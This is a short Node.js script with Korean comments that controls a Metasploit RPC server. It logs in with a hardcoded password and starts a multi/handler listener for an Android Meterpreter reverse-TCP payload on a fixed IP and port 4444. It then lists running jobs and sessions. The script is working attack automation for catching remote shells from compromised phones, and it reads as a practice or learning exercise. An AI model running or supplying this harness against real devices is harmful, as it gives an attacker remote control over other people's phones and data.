var MsfRpcClient = require('msfrpc-client-node');
var client = new MsfRpcClient({
                                password:'hacked123!@#',
                                user:'securekim', // user 항목은 msfrpc의 user
                                host:'127.0.0.1', // host 주소
                                port: '55553', // port 번호
                                persist:false
                              });

// client에 MsfRpcClient의 객체가 있기 때문에
// exec 메소드로 msfrpc 서버에 명령 전송이 가능합니다.

client.exec(['core.version']) // Metasploit의 버전을 받아오겠습니다.
.then(
  (res)=>{
    console.log(`MSF Version : ${res.version} `)
    console.log(`API Verson: ${res.api}`)
  }
)
.catch(console.log);
/*
client.exec(['module.payloads'])
.then(
	(res)=>{
		console.log(res);
	}
)

*/
//module type : exploit, auxiliary, post, payload
client.exec(['module.execute', "exploit", "exploit/multi/handler", {
	"payload":"android/meterpreter/reverse_tcp",
	"LHOST":"172.31.47.49",
	"LPORT":"4444"
}])
.then(
	(res)=>{
		console.log(res);
	}
)

console.log("HIHI");

client.exec(['job.list'])
.then(
  (res)=>{
    console.log(res);
  }
)
.catch(console.log);


client.exec('session.list')
.then(
  (res)=>{
    console.log(res)
  }
)
.catch(console.log);
